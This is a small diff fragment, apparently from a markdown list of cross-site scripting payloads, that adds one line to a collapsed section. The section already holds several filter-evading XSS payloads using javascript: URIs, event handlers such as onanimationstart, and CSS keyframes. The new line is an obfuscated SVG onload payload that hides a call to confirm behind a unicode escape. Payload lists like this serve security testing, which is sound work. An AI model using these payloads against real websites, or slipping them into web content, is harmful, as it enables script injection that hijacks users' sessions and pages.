@@ -191,6 +191,7 @@
   javascript:new%20Function`al\ert\`1\``;
   <b/onanimationstart=prompt`${document.domain}&#x60;>
   <style>@keyframes a{}b{animation:a;}</style>
+  <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
   ```
 </details>
 
